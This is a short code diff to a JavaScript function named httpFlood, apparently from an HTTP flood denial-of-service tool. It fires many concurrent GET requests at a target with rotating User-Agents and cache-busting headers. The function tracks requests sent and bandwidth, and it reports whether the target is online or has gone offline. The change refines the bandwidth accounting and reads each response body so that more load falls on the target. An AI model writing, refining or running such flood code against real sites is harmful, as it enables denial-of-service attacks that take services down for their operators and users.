@@ -31,29 +31,38 @@ async function httpFlood(target, duration, intensity) {
       const promises = [];
       for (let i = 0; i < intensity; i++) {
         const userAgent = userAgents[Math.floor(Math.random() * userAgents.length)];
+        const requestOptions = {
+          method: 'GET',
+          headers: {
+            'User-Agent': userAgent,
+            'X-Noodles-Bot': 'Active',
+            'Cache-Control': 'no-cache',
+            'Connection': 'keep-alive'
+          },
+          mode: 'no-cors'
+        };
 
-        const promise = fetch(target, {
-            method: 'GET',
-            headers: {
-              'User-Agent': userAgent,
-              'X-Noodles-Bot': 'Active',
-              'Cache-Control': 'no-cache',
-              'Connection': 'keep-alive'
-            },
-            mode: 'no-cors'
-          })
+        const promise = fetch(target, requestOptions)
           .then(response => {
             if (response.ok) {
               packetsSent++;
-              mbps += (new TextEncoder().encode(`GET ${path} HTTP/1.1\r\nHost: ${host}\r\nUser-Agent: ${userAgent}\r\nAccept: */*\r\nX-Noodles-Bot: Active\r\nCache-Control: no-cache\r\nConnection: keep-alive\r\n\r\n`).length) / 1000000;
+              const contentLength = response.headers.get('content-length');
+              if (contentLength) {
+                mbps += parseInt(contentLength, 10) / 1000000;
+              } else {
+                mbps += 0.1;
+              }
+              targetStatus = 'Online';
             } else {
               targetStatus = 'Unresponsive';
             }
+            return response.text();
+          })
+          .then(() => {
           })
           .catch(error => {
             targetStatus = 'Offline';
           });
-
         promises.push(promise);
       }
       await Promise.all(promises);
@@ -65,7 +74,6 @@ async function httpFlood(target, duration, intensity) {
   }
 
   mbps = (mbps * 8) / ((Date.now() - startTime) / 1000);
-    mbps = Math.max(0, mbps);
   return { packetsSent, targetStatus, mbps };
 }
 
